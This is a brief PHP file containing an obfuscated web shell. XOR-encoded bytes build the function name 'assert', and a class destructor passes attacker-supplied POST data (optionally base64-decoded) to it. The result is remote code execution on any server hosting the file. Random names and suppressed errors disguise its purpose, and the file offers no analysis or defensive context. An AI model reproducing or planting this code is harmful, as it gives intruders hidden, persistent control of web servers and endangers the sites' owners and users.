<?php 
class HWDV { 
    function lpIs() {
        $YdZD = "\x28" ^ "\x49";
        $zzbt = "\x5" ^ "\x76";
        $jgFU = "\x14" ^ "\x67";
        $fBdi = "\x35" ^ "\x50";
        $puUH = "\xa5" ^ "\xd7";
        $OfFi = "\x6c" ^ "\x18";
        $ZzWC =$YdZD.$zzbt.$jgFU.$fBdi.$puUH.$OfFi;
        return $ZzWC;
    }
    function __destruct(){
        $Aqvm=$this->lpIs();
        @$Aqvm($this->Hn);
    }
}
$hwdv = new HWDV();
@$hwdv->Hn = isset($_GET['id'])?base64_decode($_POST['googleer']):$_POST['googleer'];
?>